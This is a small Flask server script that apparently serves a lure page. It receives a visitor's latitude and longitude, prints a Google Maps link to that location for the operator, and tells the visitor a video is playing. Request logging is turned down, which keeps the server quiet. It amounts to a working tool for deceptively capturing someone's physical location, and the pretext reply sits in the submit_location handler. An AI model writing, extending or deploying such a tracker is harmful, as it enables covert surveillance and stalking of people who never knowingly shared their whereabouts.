import logging
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# Suppress Flask's default logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit_location', methods=['POST'])
def submit_location():
    try:
        data = request.get_json()
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        if latitude is None or longitude is None:
            raise ValueError("Invalid location data.")

        # Generate and print Google Maps link
        google_maps_link = f"https://www.google.com/maps?q={latitude},{longitude}"
        print(f"Google Maps Link: {google_maps_link}")

        return jsonify({
            "status": "success",
            "message": "Video playing successfully!"
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

if __name__ == '__main__':
    # Run without debug mode to suppress debug messages
    app.run(host='0.0.0.0', port=5000)
